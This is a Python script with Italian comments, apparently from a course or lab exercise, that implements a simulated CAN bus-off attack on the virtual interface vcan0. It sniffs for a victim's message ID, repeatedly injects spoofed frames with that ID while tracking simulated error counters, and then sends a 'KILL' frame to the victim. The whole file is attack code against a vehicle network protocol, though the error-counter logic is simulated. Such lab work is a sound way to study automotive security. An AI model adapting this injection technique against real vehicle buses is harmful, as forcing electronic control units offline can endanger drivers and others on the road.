import can
import time

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
KILL_ID = 0x777 
ATTACK_PERIOD_SEC = 5.0
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
INITIAL_TEC = 0
# ----------------------

def start_attacker_sniffing():
    
    try:
        # L'Attaccante ha bisogno di una connessione CAN che possa ricevere
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # --- FASE 1: SINCRONIZZAZIONE (SNIFFING) ---
    print(f"\n🔍 [Attaccante] FASE 1: In attesa del primo messaggio della Vittima (ID: {hex(TARGET_ID)}) per sincronizzare...")
    
    msg = None
    while msg is None or msg.arbitration_id != TARGET_ID:
        # Blocca l'esecuzione fino alla ricezione di un messaggio con il TARGET_ID
        msg = bus.recv(timeout=1.0)
        if msg is not None and msg.arbitration_id != TARGET_ID:
             # Ignora messaggi non pertinenti
             continue
        if msg is None:
             # Se scade il timeout senza messaggi, continua ad aspettare
             print("...sniffing in corso...")

    print(f"✅ [Attaccante] Sincronizzato! Ricevuto il primo messaggio a {time.strftime('%H:%M:%S')}")
    
    # --- FASE 2: ATTACCO TEMPORIZZATO ---
    victim_tec = INITIAL_TEC
    adversary_tec = INITIAL_TEC
    attack_counter = 0

    print("\n--- FASE 2: ATTACCO BUS-OFF AVVIATO (Logica Teorica) ---")
    start_time = time.time() # Iniziamo il timer dopo la sincronizzazione

    while victim_tec < BUS_OFF_THRESHOLD:
        
        # 1. Calcolo del TEC simulato (logica delle slide)
        if victim_tec < TEC_PASSIVE_THRESHOLD:
            victim_tec_change, adversary_tec_change = 8, 8
            fase_desc = "Fase 1 (Active)"
        else:
            victim_tec_change, adversary_tec_change = 7, -1 
            fase_desc = "Fase 2 (Passive)"
        
        victim_tec += victim_tec_change
        adversary_tec += adversary_tec_change
        
        # 2. Stampa e Controllo Attaccante
        print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
        print(f"[{fase_desc}] TEC Sim: V={victim_tec} ({victim_tec_change:+d}), A={adversary_tec} ({adversary_tec_change:+d})")

        if adversary_tec >= BUS_OFF_THRESHOLD:
            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si auto-disattiva. Interrompo l'attacco.")
            break
        
        # 3. Iniezione del messaggio malevolo
        try:
            msg_attack = can.Message(
                arbitration_id=TARGET_ID,
                data=[0x00] * 8, 
                is_extended_id=False
            )
            bus.send(msg_attack)
            print(f"💣 [Attaccante] Messaggio malevolo iniettato. Attesa {ATTACK_PERIOD_SEC}s...")
            
        except can.CanError:
            break

        attack_counter += 1
        time.sleep(ATTACK_PERIOD_SEC) 

    # --- Segnale di Terminazione forzata alla Vittima ---
    if victim_tec >= BUS_OFF_THRESHOLD:
        print(f"\n🎉 VITTORIA SIMULATA! Invio segnale di KILL (ID: {hex(KILL_ID)})")
        try:
            kill_msg = can.Message(arbitration_id=KILL_ID, data=[0xDE, 0xAD], is_extended_id=False)
            bus.send(kill_msg)
            time.sleep(1)
        except Exception:
            pass
        
    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    start_attacker_sniffing()
